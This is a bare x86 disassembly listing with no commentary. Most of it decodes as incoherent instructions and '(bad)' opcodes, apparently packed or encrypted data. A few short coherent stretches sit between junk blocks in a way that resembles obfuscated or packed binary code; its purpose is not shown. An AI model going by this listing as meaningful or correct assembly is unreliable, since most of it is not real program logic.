  403c02:	fstp   DWORD PTR [eax+ebx*4+0x57]
  403c06:	add    bh,al
  403c08:	and    al,0x7c
  403c0a:	and    ah,cl
  403c0c:	aas    
  403c0d:	push   ebp
  403c0e:	inc    ecx
  403c0f:	and    bh,BYTE PTR [esi+0x55]
  403c12:	jns    0x403ba2
  403c14:	mov    eax,ds:0xe1f7e3d5
  403c19:	cwde   
  403c1a:	push   edx
  403c1b:	test   DWORD PTR [ecx],0xcfa75b67
  403c21:	pop    es
  403c22:	pushf  
  403c23:	xchg   edi,eax
  403c24:	rcl    DWORD PTR [esi+0x41d1191b],0xb3
  403c2b:	adc    cl,BYTE PTR [ebx]
  403c2d:	in     eax,0x16
  403c2f:	call   0x72a1ec4c
  403c34:	test   DWORD PTR [edx+0x34],ebp
  403c37:	out    dx,eax
  403c38:	pop    ss
  403c39:	and    eax,0xe95cbcd7
  403c3e:	fldenv [ecx+0x18efd30a]
  403c44:	pop    ebx
  403c45:	adc    eax,0xcee187ad
  403c4a:	cmp    BYTE PTR [ebp-0x1e92f7a6],cl
  403c50:	pop    ss
  403c51:	mov    ebx,0xb290a807
  403c56:	sbb    BYTE PTR [esi+ebx*1-0x11ffdd27],0x1c
  403c5e:	jns    0x403c4f
  403c60:	daa    
  403c61:	xchg   esp,eax
  403c62:	fwait
  403c63:	adc    cl,bl
  403c65:	test   BYTE PTR [ebx-0x720979a0],bh
  403c6b:	sub    bh,BYTE PTR [ecx]
  403c6d:	mov    ch,0xee
  403c6f:	(bad)
  403c74:	and    ecx,DWORD PTR [ecx]
  403c76:	jne    0x403c37
  403c78:	adc    eax,0xc60c98c0
  403c7d:	inc    edi
  403c7e:	xor    DWORD PTR [ecx-0x1180b113],eax
  403c84:	arpl   WORD PTR [ecx+0x22],cx
  403c87:	add    ebp,DWORD PTR [esi-0x6e92c326]
  403c8d:	es (bad) 
  403c8f:	sti    
  403c90:	mov    eax,0x3147db82
  403c95:	sbb    DWORD PTR [edi],ebp
  403c97:	iret   
  403c98:	sub    eax,0x5dc87a8c
  403c9d:	and    DWORD PTR [edx+0x1ad1e807],esi
  403ca3:	lds    ebx,FWORD PTR ss:[edx]
  403ca6:	mov    BYTE PTR [edi-0x445f1485],cl
  403cac:	fdivr  st,st(2)
  403cae:	mov    ds:0x85ab9e87,al
  403cb3:	push   ss
  403cb4:	dec    ebp
  403cb5:	xchg   esp,eax
  403cb6:	jo     0x403cab
  403cb8:	mov    ebx,0x7d82393
  403cbd:	cdq    
  403cbe:	dec    esi
  403cbf:	sbb    eax,0x9caaf0e4
  403cc4:	push   cs
  403cc5:	mov    al,ds:0xceeac6e6
  403cca:	add    eax,0x17787689
  403ccf:	jbe    0x403d1c
  403cd1:	jmp    0xfddb1e09
  403cd6:	iret   
  403cd7:	mov    WORD PTR [ebp-0x52],?
  403cda:	pop    ebp
  403cdb:	cmovl  esp,DWORD PTR [edi-0x2070056c]
  403ce2:	push   es
  403ce3:	pusha  
  403ce4:	push   eax
  403ce5:	add    ebp,ecx
  403ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce8:	mov    ah,BYTE PTR [ecx+0x5e]
  403ceb:	std    
  403cec:	cmp    dh,bl
  403cee:	mov    bh,0xc8
  403cf0:	jnp    0x403c96
  403cf2:	test   edx,esp
  403cf4:	repz jo 0x403d57
  403cf7:	(bad)  
  403cf8:	jmp    0x7dd2:0xfe6a3be5
  403cff:	jne    0x403d6f
  403d01:	jp     0x403c98
  403d03:	test   DWORD PTR [esi-0xf],0xd1eecf8b
  403d0a:	scas   eax,DWORD PTR es:[edi]
  403d0b:	test   DWORD PTR [esp+edx*8-0xf235c6],esp
  403d12:	std    
  403d13:	sub    DWORD PTR [edi],esp
  403d15:	scas   eax,DWORD PTR es:[edi]
  403d16:	test   BYTE PTR [ebx+0x7372c4b7],ah
  403d1c:	das    
  403d1d:	mov    ch,BYTE PTR [ebx+0x64]
  403d20:	in     al,0x88
  403d22:	jge    0x403cb5
  403d24:	push   esp
  403d25:	jle    0x403d8d
  403d27:	adc    eax,0xd1ef3f0f
  403d2c:	ss mov dh,0xfd
  403d2f:	mov    DWORD PTR [ecx-0x142c415f],eax
  403d35:	cwde   
  403d36:	adc    DWORD PTR [edx+0x7],ebp
  403d39:	xchg   esp,eax
  403d3a:	out    dx,al
  403d3b:	xor    DWORD PTR [eax-0x6f33e485],edx
  403d41:	into   
  403d42:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  403d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d45:	in     eax,dx
  403d46:	push   ss
  403d47:	jmp    0x9c08:0xcf72f3eb
  403d4e:	les    esi,FWORD PTR [edi]
  403d50:	jecxz  0x403cea
  403d52:	aad    0xe2
  403d54:	lods   eax,DWORD PTR ds:[esi]
  403d55:	xlat   BYTE PTR ds:[ebx]
  403d56:	data16 mov al,ds:0x48a2d43d
  403d5c:	mov    ch,0x1c
  403d5e:	gs loop 0x403d04
  403d61:	fs mov bl,0x1b
  403d64:	sbb    bh,al
  403d66:	xchg   esp,eax
  403d67:	rcl    ebp,0x63
  403d6a:	sub    BYTE PTR [esi],al
  403d6c:	mov    DWORD PTR ds:0xed815f1c,ebx
  403d72:	cdq    
  403d73:	cdq    
  403d74:	push   cs
  403d75:	cmp    edi,esp
  403d77:	mov    al,ds:0x17ba5fd
  403d7c:	enter  0x5ef0,0xa7
  403d80:	in     eax,0x20
  403d82:	xor    eax,0x2f49807e
  403d87:	adc    al,0x4e
  403d89:	dec    esi
  403d8a:	das    
  403d8b:	push   edx
  403d8c:	pop    eax
  403d8d:	xor    DWORD PTR [edi],edx
  403d8f:	mov    cl,0x76
  403d91:	sbb    DWORD PTR [edi+0x4969dbaf],ebx
  403d97:	sub    cl,BYTE PTR [ebx]
  403d99:	dec    ebx
  403d9a:	xchg   ebx,eax
  403d9b:	mov    WORD PTR [ecx+0x19b4f9dc],ss
  403da1:	in     al,dx
  403da2:	push   esi
  403da3:	addr16 mov ecx,0x3cfc123e
  403da9:	xor    ebp,DWORD PTR [eax+0x3ae04f16]
  403daf:	push   esi
  403db0:	or     ebp,DWORD PTR [edi]
  403db2:	test   DWORD PTR [ecx],ebx
  403db4:	fadd   DWORD PTR [esi-0x46]
  403db7:	test   al,0x6e
  403db9:	dec    esp
  403dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dbb:	xchg   ebx,eax
  403dbc:	mov    edx,0x4e2f85fd
  403dc1:	pop    ecx
  403dc2:	inc    esp
  403dc3:	pop    eax
  403dc4:	dec    edx
  403dc5:	sti    
  403dc6:	sbb    eax,0x6843a613
  403dcb:	das    
  403dcc:	lods   eax,DWORD PTR ds:[esi]
  403dcd:	repz arpl WORD PTR [edx-0x7876f995],bp
  403dd4:	mov    eax,ds:0x78e5ae4d
  403dd9:	retf   0xb821
  403ddc:	imul   edi,DWORD PTR [ebx+0x3dd53eb9],0xd0229dd9
  403de6:	jl     0x403e64
  403de8:	xchg   BYTE PTR ds:0xb72243f9,ah
  403dee:	xchg   ebx,eax
  403def:	test   ebp,0xc6c46409
  403df5:	int3   
  403df6:	aaa    
  403df7:	mov    ?,WORD PTR ds:0xb340c76c
  403dfd:	aad    0xd7
  403dff:	mov    cl,0xd8
  403e01:	lahf   
  403e02:	test   eax,0xc6a6f970
  403e07:	mov    al,0x23
  403e09:	fxch   st(7)
  403e0b:	jo     0x403e89
  403e0d:	sbb    al,0x56
  403e0f:	push   edx
  403e10:	lods   eax,DWORD PTR ds:[esi]
  403e11:	loopne 0x403e46
  403e13:	and    BYTE PTR [eax-0x1eacb2ed],al
  403e19:	xchg   edi,eax
  403e1a:	mov    bl,BYTE PTR es:[edi]
  403e1d:	push   ds
  403e1e:	cmp    bl,bh
  403e20:	pushf  
  403e21:	xlat   BYTE PTR ds:[ebx]
  403e22:	xchg   BYTE PTR [ebp+0x53],bh
  403e25:	jbe    0x403dfa
  403e27:	inc    ebx
  403e28:	iret   
  403e29:	ret    0x5ce3
  403e2c:	rep lods al,BYTE PTR ds:[esi]
  403e2e:	xchg   ecx,eax
  403e2f:	cld    
  403e30:	fist   WORD PTR [eax-0x75a990a]
  403e36:	mov    eax,ds:0x5351616e
  403e3b:	test   eax,0x6700b25c
  403e40:	(bad)  
  403e41:	cmp    DWORD PTR [edx],0xffffff8b
  403e44:	ins    DWORD PTR es:[edi],dx
  403e45:	sahf   
  403e46:	add    eax,0x60aa4e4e
  403e4b:	pop    ecx
  403e4c:	jecxz  0x403e9a
  403e4e:	xchg   ecx,eax
  403e4f:	adc    BYTE PTR [eax+0x33],bl
  403e52:	pop    ebp
  403e53:	pop    es
  403e54:	rol    DWORD PTR [esi],cl
  403e56:	imul   ecx,esi,0xb0f45bad
  403e5c:	and    eax,0xa7855a3
  403e61:	icebp  
  403e62:	and    esi,esp
  403e64:	stos   BYTE PTR es:[edi],al
  403e65:	js     0x403edf
  403e67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e68:	(bad)  
  403e69:	mov    bh,0xf
  403e6b:	ins    DWORD PTR es:[edi],dx
  403e6c:	ds push ds
  403e6e:	mov    ah,0xe9
  403e70:	(bad)  
  403e71:	cmp    esi,DWORD PTR [ebx]
  403e73:	sar    bh,0x6c
  403e76:	adc    esi,eax
  403e78:	cmp    ch,BYTE PTR [esi+0x1b]
  403e7b:	mov    bl,0x47
  403e7d:	jmp    0xdeb28819
  403e82:	add    DWORD PTR [eax-0x4f04ee47],esi
  403e88:	mov    eax,0xcec1b06d
  403e8d:	jl     0x403e79
  403e8f:	push   edx
  403e91:	(bad)  
  403e92:	push   esi
  403e93:	add    edx,ebx
  403e95:	in     al,0x8e
  403e97:	imul   edi,ebx,0x43
  403e9a:	loop   0x403ea9
  403e9c:	jg     0x403e46
  403e9e:	lods   eax,DWORD PTR ds:[esi]
  403e9f:	ret    0x98cf
  403ea2:	pop    ecx
  403ea3:	mov    ds:0xc08de755,al
  403ea8:	sub    DWORD PTR [eax+ebp*2+0x7e],esp
  403eac:	cs jae 0x403ed8
  403eaf:	ficomp WORD PTR [ecx]
  403eb1:	lods   eax,DWORD PTR ds:[esi]
  403eb2:	sub    edx,DWORD PTR [ebx+edi*1-0x2]
  403eb6:	imul   esp,esp,0xc
  403eb9:	xchg   ebp,eax
  403eba:	ss pop ecx
  403ebc:	pushf  
  403ebd:	cli    
  403ebe:	sub    edi,DWORD PTR [edi-0x7a7e5c80]
  403ec4:	shl    BYTE PTR [ecx+0x143d3231],cl
  403eca:	sub    eax,edi
  403ecc:	leave  
  403ecd:	(bad)  
  403ece:	xchg   edi,eax
  403ecf:	push   ebp
  403ed0:	and    DWORD PTR [edi],esi
  403ed2:	scas   al,BYTE PTR es:[edi]
  403ed3:	cli    
  403ed4:	xchg   edi,eax
  403ed5:	in     eax,dx
  403ed6:	das    
  403ed7:	clc    
  403ed8:	sub    eax,0x4b649116
  403edd:	cmp    bh,BYTE PTR [esi-0x7a]
  403ee0:	pop    esp
  403ee1:	add    BYTE PTR [ebp+0x7e573a2e],dl
  403ee7:	test   DWORD PTR [eax],0x1df90836
  403eed:	mov    edi,DWORD PTR [esi]
  403eef:	test   al,0xfd
  403ef1:	out    dx,eax
  403ef2:	int3   
  403ef3:	pop    esp
  403ef4:	scas   eax,DWORD PTR es:[edi]
  403ef5:	push   ds
  403ef6:	jecxz  0x403ea3
  403ef8:	lods   al,BYTE PTR ds:[esi]
  403ef9:	das    
  403efa:	inc    ebx
  403efb:	shr    DWORD PTR [edi-0x72],1
  403efe:	xor    esi,DWORD PTR [ecx+edx*2]
  403f01:	and    BYTE PTR [edx+0x19faff9d],dh
  403f07:	dec    esp
  403f08:	sub    eax,0x1030e4c
  403f0d:	sbb    DWORD PTR ds:0x42816f,ebx
  403f13:	mov    DWORD PTR [ebp-0x14],eax
  403f16:	mov    ecx,DWORD PTR [ebx]
  403f18:	mov    eax,DWORD PTR [ebx+0x4]
  403f1b:	mov    edx,DWORD PTR ds:0x4281ef
  403f21:	mov    edx,DWORD PTR [edx]
  403f23:	add    DWORD PTR ds:0x42837b,edx
  403f29:	shrd   ecx,eax,0x2
  403f2d:	sub    edx,0x9bd
  403f33:	shr    eax,0x2
  403f36:	and    eax,eax
  403f38:	mov    eax,DWORD PTR [ebx]
  403f3a:	and    DWORD PTR ds:0x428237,0x5c10
  403f44:	jmp    0x404322
  403f49:	sub    DWORD PTR [ecx-0x65e52424],0xffffff82
  403f50:	and    esi,esi
  403f52:	sbb    BYTE PTR [ecx+0x850e4bc],ch
  403f58:	push   0xffffffce
  403f5a:	xlat   BYTE PTR ds:[ebx]
  403f5b:	sbb    BYTE PTR [eax],bl
  403f5d:	sahf   
  403f5e:	adc    bl,BYTE PTR [eax]
  403f60:	sbb    BYTE PTR [esi+0x6f28cf00],cl
  403f66:	jmp    0xecbf:0x75f4edf4
  403f6d:	dec    ebx
  403f6e:	add    edx,DWORD PTR [ebp+edi*8-0x20b9ded5]
  403f75:	ret    
  403f76:	mov    ebp,0x2cf13f12
  403f7b:	add    eax,0x4fd9b45e
  403f80:	outs   dx,DWORD PTR ds:[esi]
  403f81:	push   edi
  403f83:	inc    edx
  403f84:	int    0x4c
  403f86:	shl    eax,1
  403f88:	aam    0xa7
  403f8a:	ins    DWORD PTR es:[edi],dx
  403f8b:	pop    es
  403f8c:	mov    WORD PTR [eax],gs
  403f8e:	adc    dl,BYTE PTR [esi]
  403f90:	mov    DWORD PTR [ebp-0x74],ebp
  403f93:	add    BYTE PTR [eax+0x6f],cl
  403f96:	xchg   edx,eax
  403f97:	xchg   ebp,eax
  403f98:	cmp    esi,DWORD PTR [eax]
  403f9a:	xor    al,0xbb
  403f9c:	shr    BYTE PTR [edi],1
  403f9e:	push   ds
  403f9f:	mov    BYTE PTR [eax+ebp*2-0x7b9c9881],cl
  403fa6:	push   esp
  403fa7:	shl    DWORD PTR [edi-0x4e],1
  403faa:	mov    WORD PTR [ebx-0x4],fs
  403fad:	xchg   ebx,eax
  403fae:	pop    ebx
  403faf:	pop    esi
  403fb0:	cli    
  403fb1:	retf   
  403fb2:	hlt    
  403fb3:	or     cl,cl
  403fb5:	lea    ebp,[ebx+0x6a97be74]
  403fbb:	fidivr WORD PTR [edx]
  403fbd:	popf   
  403fbe:	call   0x1fbe:0xc902ec2a
  403fc5:	js     0x403ff2
  403fc7:	outs   dx,BYTE PTR ds:[esi]
  403fc8:	adc    edx,DWORD PTR [ecx]
  403fca:	cmp    eax,0x1e4eb45b
  403fcf:	loopne 0x404047
  403fd1:	ja     0x404006
  403fd3:	in     al,0x5a
  403fd5:	out    0x29,eax
  403fd7:	outs   dx,DWORD PTR ds:[esi]
  403fd8:	int3   
  403fd9:	in     al,dx
  403fda:	ror    BYTE PTR [ebx+0x1a],1
  403fdd:	and    BYTE PTR [ebx+0x32],dh
  403fe0:	out    0xa9,al
  403fe2:	sbb    bl,BYTE PTR [esi+ebp*4-0x5029fa6e]
  403fe9:	outs   dx,DWORD PTR ds:[esi]
  403fea:	cmp    DWORD PTR [edi-0x3e],ebx
  403fed:	ja     0x403ff9
  403fef:	jnp    0x404033
  403ff1:	test   al,0x3f
  403ff3:	test   ch,ch
  403ff5:	jne    0x403f9e
  403ff7:	aaa    
  403ff8:	nop
  403ff9:	out    0xde,al
  403ffb:	fs fsub st(0),st
  403ffe:	imul   esi,DWORD PTR [ebx],0xffffffe0
  404001:	adc    BYTE PTR [edx],0x7d
  404004:	(bad)  
  404006:	not    DWORD PTR [esi]
  404008:	fild   WORD PTR [ecx]
  40400a:	mov    esp,0x9ec05e44
  40400f:	out    0xb4,eax
  404011:	(bad)  
  404012:	push   cs
  404013:	test   ch,ch
  404015:	in     al,0x58
  404017:	sbb    eax,0x98eaf963
  40401c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40401d:	clc    
  40401e:	cmp    eax,0x48cc9a26
  404023:	scas   al,BYTE PTR es:[edi]
  404024:	pop    es
  404025:	out    dx,al
  404026:	call   0xa55b:0x260d093b
  40402d:	adc    ch,ch
  40402f:	xor    ebx,eax
  404031:	jecxz  0x4040a5
  404033:	xchg   ebp,eax
  404034:	rcr    BYTE PTR [ebp-0x1866362d],1
  40403a:	jmp    0xa1d4:0x560cfaa4
  404041:	jmp    0xae46:0x178cb8eb
  404048:	in     al,dx
  404049:	pusha  
  40404a:	lock scas al,BYTE PTR es:[edi]
  40404c:	jb     0x404077
  40404e:	xchg   ecx,eax
  40404f:	jle    0x403fd3
  404051:	mov    ch,0x19
  404053:	cdq    
  404054:	jecxz  0x4040b4
  404056:	xor    BYTE PTR [ecx+0xb],ah
  404059:	js     0x40405f
  40405b:	mov    ch,0xc4
  40405d:	fisubr WORD PTR [ecx]
  40405f:	into   
  404060:	fcmovnb st,st(6)
  404062:	sahf   
  404063:	stc    
  404064:	sbb    eax,0xa4baba77
  404069:	xchg   ecx,eax
  40406a:	xor    DWORD PTR [ebx],esp
  40406c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40406d:	fcom   QWORD PTR ss:[ebx*2-0x2d09b165]
  404075:	inc    BYTE PTR [edx-0x241f983]
  40407b:	fcomp  DWORD PTR [edi-0x7cd03c81]
  404081:	imul   esi,DWORD PTR [edi-0x6dcd6a4c],0x705de534
  40408b:	enter  0xdc7f,0x46
  40408f:	ret    
  404090:	rol    DWORD PTR [ebp-0x33],1
  404093:	dec    edx
  404094:	ficom  WORD PTR [bx+di+0x71d9]
  404099:	cmp    al,0xfd
  40409b:	ins    BYTE PTR es:[edi],dx
  40409c:	xchg   ecx,edi
  40409e:	and    bl,ah
  4040a0:	jl     0x40410a
  4040a2:	xchg   esi,eax
  4040a3:	adc    BYTE PTR [esi],cl
  4040a5:	push   0x83cb70c0
  4040aa:	sbb    eax,0xa1a7c6ae
  4040af:	rcl    DWORD PTR [edx+0x3b],0x82
  4040b3:	sub    BYTE PTR [edi+0x794ba52b],dh
  4040b9:	push   es
  4040ba:	cmp    cl,ah
  4040bc:	jne    0x4040c8
  4040be:	sar    BYTE PTR [esi],0x6f
  4040c1:	cli    
  4040c2:	add    al,0x2e
  4040c4:	cli    
  4040c5:	jg     0x404120
  4040c7:	out    dx,eax
  4040c8:	or     BYTE PTR [ebp+0x3e],dl
  4040cb:	inc    edi
  4040cc:	xor    esi,DWORD PTR [edx-0x74]
  4040cf:	retf   0x33df
  4040d2:	(bad)  
  4040d3:	int    0x37
  4040d5:	inc    edx
  4040d6:	xor    ah,BYTE PTR [ebx+0x3f20527c]
  4040dc:	aaa    
  4040dd:	(bad)  
  4040de:	mov    eax,0x1997cec2
  4040e3:	xor    ecx,edx
  4040e5:	out    0x13,al
  4040e7:	cwde   
  4040e8:	jmp    0x979a41a6
  4040ed:	pop    esp
  4040ee:	in     eax,dx
  4040ef:	xchg   esi,eax
  4040f0:	cmp    BYTE PTR fs:[edi-0x78],0x3
  4040f5:	push   edi
  4040f6:	pop    ss
  4040f7:	std    
  4040f8:	mov    BYTE PTR [ecx],ah
  4040fa:	fistp  DWORD PTR [esi-0x56d158ab]
  404100:	jmp    0x5ab28186
  404105:	aas    
  404106:	add    ebp,esp
  404108:	in     al,dx
  404109:	fimul  WORD PTR [ebx+0x84b4909]
  40410f:	push   ds
  404110:	dec    edx
  404111:	jmp    0x6cb4:0x8e80ab68
  404118:	mov    al,0xd4
  40411a:	lods   eax,DWORD PTR ds:[esi]
  40411b:	out    dx,al
  40411c:	add    ch,BYTE PTR [edi]
  40411e:	push   0x1c050f36
  404123:	xor    DWORD PTR fs:[ebp+0x63],0xffffffe5
  404128:	sbb    bh,BYTE PTR [eax]
  40412a:	popf   
  40412b:	jne    0x404133
  40412d:	repnz fidiv WORD PTR [edi-0x50]
  404131:	jmp    0x4a30:0x5ac08b73
  404138:	cmp    bh,ch
  40413a:	daa    
  40413b:	(bad)  
  40413c:	dec    ebp
  40413d:	cmp    eax,DWORD PTR [esi+0x52]
  404140:	xchg   edi,eax
  404141:	mov    edx,0xb987de5d
  404146:	mov    bh,BYTE PTR ds:0x992e4978
  40414c:	clc    
  40414d:	rcr    dh,cl
  40414f:	xor    eax,0x667fc15c
  404154:	add    DWORD PTR [ebx-0x3df579ad],ebp
  40415a:	or     bl,BYTE PTR [ebx]
  40415c:	xchg   ebx,eax
  40415d:	cld    
  40415e:	(bad)  
  404160:	mov    DWORD PTR [ebx-0x3fc65d69],0xedecb8e0
  40416a:	es jp  0x404191
  40416d:	xchg   BYTE PTR [ebx-0x1a4f9953],dl
  404173:	fs inc eax
  404175:	add    dh,dl
  404177:	xor    DWORD PTR [ebx+esi*4-0x362a2245],eax
  40417e:	test   eax,0x63ef5794
  404183:	test   esi,eax
  404185:	push   0x49
  404187:	jl     0x4041cc
  404189:	mov    cl,0xea
  40418b:	jnp    0x40420a
  40418d:	xchg   edx,eax
  40418e:	out    dx,al
  40418f:	or     eax,0x80ac1bac
  404194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404195:	and    al,0xe9
  404197:	jecxz  0x4041f5
  404199:	aaa    
  40419a:	dec    ecx
  40419b:	lea    cx,ds:0xa125ed13
  4041a2:	sti    
  4041a3:	sub    ch,BYTE PTR [ecx]
  4041a5:	inc    eax
  4041a6:	and    DWORD PTR [ebx+0x23],ebp
  4041a9:	lods   eax,DWORD PTR ds:[esi]
  4041aa:	lock in al,dx
  4041ac:	out    0x33,eax
  4041ae:	out    0x8f,al
  4041b0:	daa    
  4041b1:	mov    DWORD PTR [ebp+0x5d],ebp
  4041b4:	jl     0x404143
  4041b6:	jno    0x404213
  4041b8:	(bad)  
  4041ba:	out    0x7c,eax
  4041bc:	retf   
  4041bd:	clc    
  4041be:	push   edi
  4041bf:	pusha  
  4041c0:	je     0x40421e
  4041c2:	mov    al,0x3e
  4041c4:	pop    ds
  4041c5:	adc    al,0xb8
  4041c7:	inc    eax
  4041c8:	arpl   WORD PTR [ebp+0x3cdc9dbd],bp
  4041ce:	stos   DWORD PTR es:[edi],eax
  4041cf:	mov    edx,edi
  4041d1:	xchg   ecx,eax
  4041d2:	and    BYTE PTR [eax],bl
  4041d4:	pop    ebx
  4041d5:	dec    ebp
  4041d6:	pop    ebx
  4041d7:	(bad)  
  4041d8:	mov    esp,0x50558988
  4041dd:	stos   BYTE PTR es:[edi],al
  4041de:	sbb    BYTE PTR [ecx-0x1b9cef82],al
  4041e4:	cmp    BYTE PTR [edx],0x89
  4041e7:	out    0x4f,eax
  4041e9:	jg     0x4041e5
  4041eb:	xor    bl,BYTE PTR [edi+0x7a87554]
  4041f1:	cmp    eax,0x519e30d6
  4041f6:	push   esp
  4041f7:	inc    esi
  4041f8:	cmp    dh,BYTE PTR [edx+0xf9b8455]
  4041fe:	pop    eax
  4041ff:	push   eax
  404200:	inc    edi
  404201:	cmp    al,0xa
  404203:	xor    edx,DWORD PTR [eax+0x281de369]
  404209:	mov    ah,BYTE PTR [esi]
  40420b:	(bad)  
  40420c:	stos   BYTE PTR es:[edi],al
  40420d:	mov    ds:0xd6cb439,eax
  404212:	jbe    0x4041a9
  404214:	xchg   DWORD PTR [esi],esp
  404216:	mov    esi,0xda0dfa2a
  40421b:	bound  esp,QWORD PTR [edi]
  40421d:	repz cmp al,0x57
  404220:	sbb    eax,0xd8cc3e06
  404225:	add    dh,0x56
  404228:	sub    al,ah
  40422a:	xchg   ebp,eax
  40422b:	jle    0x4041d7
  40422d:	retf   0x5bef
  404230:	mov    esi,0x8dfcf52c
  404235:	out    dx,eax
  404236:	std    
  404237:	ror    DWORD PTR [edx+0x5a],cl
  40423a:	jno    0x4042b1
  40423c:	imul   eax,DWORD PTR [edx+0x56],0x12704daf
  404243:	cmp    eax,0xa41a91bc
  404248:	dec    ebx
  404249:	jl     0x40420e
  40424b:	or     al,0x7d
  40424d:	and    al,0xd4
  40424f:	and    eax,DWORD PTR [edx+0x57106a85]
  404255:	inc    esp
  404256:	mov    ecx,0x70e686aa
  40425b:	iret   
  40425c:	(bad)  
  40425d:	int    0x5b
  40425f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404260:	mov    bl,BYTE PTR [eax]
  404262:	cmp    esp,DWORD PTR [ecx-0x1d]
  404265:	or     esi,DWORD PTR [edx]
  404267:	cwde   
  404268:	pop    ebx
  404269:	jl     0x404290
  40426b:	fidivr DWORD PTR [ebx+0x55]
  40426e:	shl    ch,1
  404270:	mov    ds:0xd5c1f080,eax
  404275:	jp     0x404241
  404277:	aam    0xc4
  404279:	fisttp QWORD PTR [eax-0x10]
  40427c:	mov    edx,0x8f7b31de
  404281:	xchg   esp,eax
  404282:	dec    edi
  404283:	lods   eax,DWORD PTR ds:[esi]
  404284:	xor    WORD PTR [edx+0x1b],si
  404288:	les    edi,FWORD PTR [esi-0x24aa7d37]
  40428e:	xrelease mov BYTE PTR [eax],ah
  404291:	out    dx,al
  404292:	fsubr  DWORD PTR [edi-0x44]
  404295:	stc    
  404296:	aam    0x99
  404298:	stc    
  404299:	dec    edx
  40429a:	dec    edi
  40429b:	popf   
  40429c:	in     al,0x1c
  40429e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40429f:	mov    al,BYTE PTR [edi-0x2e30253e]
  4042a5:	mov    ch,0x33
  4042a7:	push   ecx
  4042a8:	or     esp,esp
  4042aa:	push   edx
  4042ab:	jg     0x404301
  4042ad:	cwde   
  4042ae:	push   0xffffffd4
  4042b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042b1:	add    al,0x56
  4042b3:	jbe    0x404313
  4042b5:	push   0x9f978290
  4042ba:	xchg   ecx,eax
  4042bb:	sahf   
  4042bc:	out    0x21,eax
  4042be:	pop    ecx
  4042bf:	out    0x5f,eax
  4042c1:	int3   
  4042c2:	rol    DWORD PTR [eax+esi*1+0x3c],cl
  4042c6:	cwde   
  4042c7:	xor    ebx,DWORD PTR [edx-0x19]
  4042ca:	lea    edi,[ebp-0x28b9fc1f]
  4042d0:	jae    0x4042f5
  4042d2:	fdivr  QWORD PTR [esi+0x61323e42]
  4042d8:	rcr    DWORD PTR [ebp-0x25],1
  4042db:	shr    BYTE PTR [ecx-0x20],0x74
  4042df:	enter  0xe7e7,0x6
  4042e3:	out    0x3,eax
  4042e5:	sahf   
  4042e6:	(bad)  
  4042e7:	js     0x4042c6
  4042e9:	ret    0x97ab
  4042ec:	and    DWORD PTR [eax-0x444cf66c],ecx
  4042f2:	xor    eax,0xcb813ab9
  4042f7:	lds    eax,FWORD PTR [ebx]
  4042f9:	out    dx,al
  4042fa:	pop    ss
  4042fb:	mov    dl,0xa7
  4042fd:	inc    ebx
  4042fe:	mov    cl,0x14
  404300:	push   eax
  404301:	add    eax,0x4cde848
  404306:	xor    al,0xd1
  404308:	mov    bl,0xb5
  40430a:	in     eax,0x7a
  40430c:	push   esi
  40430d:	fs push esi
  40430f:	inc    esi
  404310:	mov    BYTE PTR [ecx],dl
  404312:	lea    edx,ds:0x277c10a4
  404318:	adc    DWORD PTR [edi+0x4a3828cb],eax
  40431e:	out    dx,eax
  40431f:	test   DWORD PTR [edx],ebx
  404321:	push   edx
  404322:	mov    edx,DWORD PTR [ebx+0x4]
  404325:	and    DWORD PTR ds:0x42823b,ebx
  40432b:	xor    ecx,edi
  40432d:	or     edx,DWORD PTR ds:0x42826b
  404333:	shl    eax,0x1e
  404336:	and    edx,DWORD PTR ds:0x4282e7
  40433c:	xor    eax,eax
  40433e:	mov    edx,DWORD PTR ds:0x428227
  404344:	and    DWORD PTR ds:0x428387,edx
  40434a:	or     eax,ecx
  40434c:	mov    ecx,DWORD PTR [ebx]
  40434e:	movzx  edx,BYTE PTR ds:0x42836f
  404355:	sbb    DWORD PTR ds:0x42827b,edx
  40435b:	mov    edx,DWORD PTR [ebx+0x4]
  40435e:	jmp    0x40473c
  404363:	xchg   BYTE PTR [eax+ebp*4],ch
  404366:	xchg   edx,eax
  404367:	call   0x1412:0x951c227a
  40436e:	stos   BYTE PTR es:[edi],al
  40436f:	out    0x17,al
  404371:	jmp    0x404331
  404373:	push   ebp
  404374:	iret   
  404375:	sbb    BYTE PTR [eax],bl
  404377:	sahf   
  404378:	adc    bl,BYTE PTR [eax]
  40437a:	sbb    BYTE PTR [eax-0x76079618],cl
  404380:	std    
  404381:	ss ins BYTE PTR es:[edi],dx
  404383:	test   DWORD PTR [esp+eax*1],eax
  404386:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404387:	dec    ebx
  404388:	mov    dl,0xba
  40438a:	mov    edi,0x75ed1aea
  40438f:	retf   0xaddd
  404392:	leave  
  404393:	sahf   
  404394:	dec    esi
  404395:	add    eax,DWORD PTR [edx+0x46]
  404398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404399:	stos   BYTE PTR es:[edi],al
  40439a:	(bad)  
  40439b:	clc    
  40439c:	xchg   ebx,eax
  40439d:	adc    bh,dl
  40439f:	push   cs
  4043a0:	mov    eax,ds:0x4fe57cb5
  4043a5:	lock aas 
  4043a7:	jmp    0x4043da
  4043a9:	fcmove st,st(3)
  4043ab:	mov    dh,0xa
  4043ad:	xchg   ebx,eax
  4043ae:	stos   BYTE PTR es:[edi],al
  4043af:	mov    ds:0xbf7f0b83,eax
  4043b4:	add    edx,0x92256aae
  4043ba:	add    edx,ebx
  4043bc:	mov    edi,0x70fa3ef5
  4043c1:	cmp    al,BYTE PTR [esi]
  4043c3:	mov    esp,0x24287f29
  4043c8:	in     eax,0x82
  4043ca:	bound  esp,QWORD PTR [edi+0x1a]
  4043cd:	fcomp  DWORD PTR [esp+edx*4]
  4043d0:	nop
  4043d1:	add    DWORD PTR [edi-0x61],0xffffffec
